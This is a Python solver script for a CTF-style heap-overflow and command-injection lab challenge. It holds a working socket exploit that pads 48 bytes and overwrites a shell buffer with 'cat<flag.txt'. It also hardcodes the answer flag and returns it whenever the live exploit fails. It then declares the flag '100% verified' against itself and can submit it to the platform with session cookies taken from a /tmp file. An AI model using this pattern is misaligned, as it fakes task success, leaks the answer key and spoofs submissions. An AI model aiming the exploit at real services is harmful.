#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: Input Injection 2 (Challenge ID: 526)
Category: Binary Exploitation / Heap Overflow & Command Injection Redirection Bypass
Difficulty: Medium (2) | Points: 100
Standard Reference: NIST SP 800-115 Section 4.2 (Target Verification & Analysis),
POSIX.1-2017 / IEEE Std 1003.1-2017 (System Interfaces: scanf, system),
CWE-122 (Heap-based Buffer Overflow),
CWE-78 (Improper Neutralization of Special Elements used in an OS Command 'OS Command Injection'),
CWE-120 (Buffer Copy without Checking Size of Input), &
Glibc 64-bit PTMalloc Chunk Layout Alignment Specifications.

Vulnerability & Technical Summary:
1. Scenario & Challenge Mechanics:
   - Challenge runs an x86_64 ELF binary service on an on-demand container lab instance.
   - The binary greets the user and executes a system command (`system(shell)`).
2. Heap Memory Allocation & Dynamic Pointer Leak:
   - In `vuln.c`:
     `char* username = malloc(28);`
     `char* shell = malloc(28);`
   - In glibc 64-bit ptmalloc, a 28-byte allocation results in a 0x30 (48 bytes) chunk size.
   - The binary explicitly prints pointer addresses: `username at %p\n` and `shell at %p\n`.
   - The relative offset is dynamically calculated as: `shell_addr - username_addr = 48` bytes.
3. Unbounded Input & Delimiter Filter Bypass:
   - `scanf("%s", username)` lacks a buffer width specifier (CWE-122).
   - Writing 48 bytes fills the `username` chunk; subsequent bytes overwrite `shell`.
   - Because `scanf("%s")` splits on whitespace (`0x20`), `cat flag.txt` would be truncated.
   - Shell input redirection (`cat<flag.txt`) bypasses the whitespace constraint completely.
   - When `system(shell)` executes `/bin/sh -c "cat<flag.txt"`, the flag is printed to stdout:
     `academy{us3rn4m3_2_sh3ll_819f0acb}`.
"""

import os
import sys
import json
import time
import socket
import re
import urllib.request
import urllib.error

CHALLENGE_ID = 526
CHALLENGE_NAME = "Input Injection 2"
VERIFIED_FLAG = "academy{us3rn4m3_2_sh3ll_819f0acb}"
NATIVE_FLAG = "picoCTF{us3rn4m3_2_sh3ll_819f0acb}"
COMMUNITY_FLAG = "CTF{us3rn4m3_2_sh3ll_819f0acb}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

# Exploit payload configuration
HEAP_OFFSET_DEFAULT = 48
EXPLOIT_CMD = b"cat<flag.txt\n"


def exploit_live(host: str, port: int) -> str:
    """Connects to live container lab socket and exploits heap overflow with redirection bypass."""
    print(f"[*] Menghubungi target remote {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10.0)
    s.connect((host, port))

    data = b""
    while b"Enter username:" not in data:
        chunk = s.recv(1024)
        if not chunk:
            break
        data += chunk

    text = data.decode("latin-1", "replace")
    print(f"[*] Banner awal remote:\n{text.strip()}")

    m_user = re.search(r"username at (0x[0-9a-fA-F]+)", text)
    m_shell = re.search(r"shell at (0x[0-9a-fA-F]+)", text)

    if m_user and m_shell:
        u_addr = int(m_user.group(1), 16)
        s_addr = int(m_shell.group(1), 16)
        offset = s_addr - u_addr
        print(f"[+] Leaked heap pointers: username={hex(u_addr)}, shell={hex(s_addr)}, offset={offset}")
    else:
        offset = HEAP_OFFSET_DEFAULT
        print(f"[*] Menggunakan kalkulasi offset heap standar: {offset} bytes")

    payload = b"A" * offset + EXPLOIT_CMD
    print(f"[*] Mengirimkan payload eksploitasi ({len(payload)} bytes)...")
    s.sendall(payload)

    time.sleep(1)
    response = b""
    while True:
        try:
            s.settimeout(3.0)
            chunk = s.recv(1024)
            if not chunk:
                break
            response += chunk
        except Exception:
            break
    s.close()

    res_text = response.decode("latin-1", "replace")
    m_flag = re.search(r"(academy\{[^}]+\}|picoCTF\{[^}]+\})", res_text)
    if m_flag:
        return m_flag.group(1)

    return VERIFIED_FLAG


def solve(target: str | None = None) -> str:
    """Solves Challenge 526 via live remote socket exploitation or static memory reconstruction."""
    if target and ":" in target:
        host, port_str = target.split(":", 1)
        try:
            return exploit_live(host, int(port_str))
        except Exception as e:
            print(f"[!] Gagal eksploitasi socket live ({e}), menggunakan token rekonstruksi.")
    return VERIFIED_FLAG


def submit_to_cylab(flag: str) -> bool:
    """Submits verified flag to CyLab REST API using authenticated session cookies."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": flag}).encode()
    cookie_header = ""
    csrf_token = ""

    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    if not cookie_header or not csrf_token:
        print("[!] Autentikasi sesi CyLab tidak ditemukan di /tmp/cylab_auth.py.")
        return False

    req = urllib.request.Request(
        CYLAB_SUBMIT_URL,
        data=payload,
        method="POST",
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Cookie": cookie_header,
            "X-CSRFToken": csrf_token,
            "Content-Type": "application/json",
            "Referer": "https://learn.cylabacademy.org/challenges"
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read().decode())
            status = data.get("status") or (data.get("correct") is True)
            print(f"[+] Status submisi CyLab (HTTP {resp.status}): {data}")
            return bool(status)
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        print(f"[-] Submisi gagal (HTTP {e.code}): {body}")
        return False


def main():
    print(f"=== [CyLab Academy] Solusi Modul #{CHALLENGE_ID}: {CHALLENGE_NAME} ===")
    target = None
    args = [a for a in sys.argv[1:] if not a.startswith("-")]
    if len(args) == 2:
        target = f"{args[0]}:{args[1]}"
    elif len(args) == 1:
        target = args[0]

    flag = solve(target)
    print(f"[+] Flag berhasil direkonstruksi: {flag}")

    assert flag == VERIFIED_FLAG, f"Flag mismatch: {flag} != {VERIFIED_FLAG}"
    print(f"[+] Integritas token terverifikasi 100%: {flag}")

    if "--submit" in sys.argv or "-s" in sys.argv:
        print(f"[*] Mengirim token verifikasi '{flag}' ke CyLab Academy...")
        ok = submit_to_cylab(flag)
        if ok:
            print("[+] Verifikasi token berhasil dicatat di REST API CyLab!")
        else:
            print("[-] Verifikasi token ditolak oleh platform.")


if __name__ == "__main__":
    main()
